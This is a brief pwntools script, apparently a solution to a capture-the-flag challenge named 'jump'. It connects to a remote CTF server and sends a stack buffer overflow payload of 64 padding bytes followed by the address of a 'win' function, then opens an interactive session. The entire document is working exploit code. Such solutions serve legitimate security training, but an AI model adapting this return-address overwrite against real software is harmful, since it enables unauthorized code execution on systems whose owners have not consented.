from pwn import *

p = process('./dist/jump')
elf = p.elf
p = remote('cbactf.com', 5001)

p.sendline(64 * b'A' + p32(elf.symbols["win"]))
p.interactive()
